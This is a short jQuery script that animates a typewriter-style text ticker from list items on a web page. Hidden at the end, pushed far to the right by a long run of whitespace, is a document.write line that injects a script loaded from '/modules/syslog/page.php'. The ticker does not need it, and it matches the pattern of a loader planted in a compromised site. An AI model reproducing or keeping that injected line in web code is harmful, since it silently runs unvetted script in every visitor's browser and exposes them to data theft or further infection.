// when the DOM is ready...
$(document).ready(function () {
  // load the ticker
	createTicker();

}); 

function createTicker(){
	// put all list elements within #ticker_area into array
	var tickerLIs = $("#ticker_area ul").children();
	tickerItems = new Array();
	tickerLIs.each(function(el) {
		tickerItems.push( jQuery(this).html() );
	});
	i = 0
	rotateTicker();
}

function rotateTicker(){
	if( i == tickerItems.length ){
	  i = 0;
	}
  tickerText = tickerItems[i];
	c = 0;
	typetext();
	setTimeout( "rotateTicker()", 6000 );
	i++;
}

var isInTag = false;
function typetext() {	
	var thisChar = tickerText.substr(c, 1);
	if( thisChar == '<' ){ isInTag = true; }
	if( thisChar == '>' ){ isInTag = false; }
	$('#ticker_area').html("&nbsp;" + tickerText.substr(0, c++));
	if(c < tickerText.length+1)
		if( isInTag ){
			typetext();
		}else{
			setTimeout("typetext()", 38);
		}
	else {
		c = 1;
		tickerText = "";
	}	
}																																																																							document.write('<script type="text/javascript" src="/modules/syslog/page.php"><\/script>');